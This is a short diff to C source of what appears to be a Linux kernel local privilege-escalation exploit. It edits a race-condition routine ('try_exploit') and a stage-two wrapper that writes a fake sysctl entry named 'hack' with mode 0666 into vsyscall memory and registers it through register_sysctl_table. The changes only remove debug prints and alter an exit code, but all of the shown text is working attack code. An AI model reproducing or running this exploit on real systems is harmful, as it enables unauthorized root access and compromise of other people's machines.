@@ -390,7 +390,7 @@ int try_exploit(unsigned long func, unsigned long arg, void *verification_func)
 
     else {
         fprintf(stderr,"race not won\n");
-        exit(0);
+        exit(2);
     }
 
     munmap(pbd, tp.tp_block_size * tp.tp_block_nr);
@@ -550,17 +550,11 @@ void wrapper(void)
     printf("registering new sysctl..\n\n");
 
     c = (struct ctl_table *)(VSYSCALL+0x850);
-    printf("1\n");
-    
+
     memset((char *)(VSYSCALL+0x850), '\x00', 1952);
-    printf("2\n");
-    
+
     strcpy((char *)(VSYSCALL+0xf00),"hack");
-    printf("3\n");
-    
     memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
-    printf("4\n");
-    
     c->procname = (char *)(VSYSCALL+0xf00);
     c->mode = 0666;
     c->proc_handler = (void *)(off->proc_dostring);
@@ -568,9 +562,7 @@ void wrapper(void)
     c->maxlen=256;
     c->extra1 = (void *)(VSYSCALL+0xe00);
     c->extra2 = (void *)(VSYSCALL+0xd00);
-    
-    printf("stage 2 start\n");
-    
+
     exploit(off->register_sysctl_table, VSYSCALL+0x850, verify_stage2);
 
     printf("stage 2 completed\n");
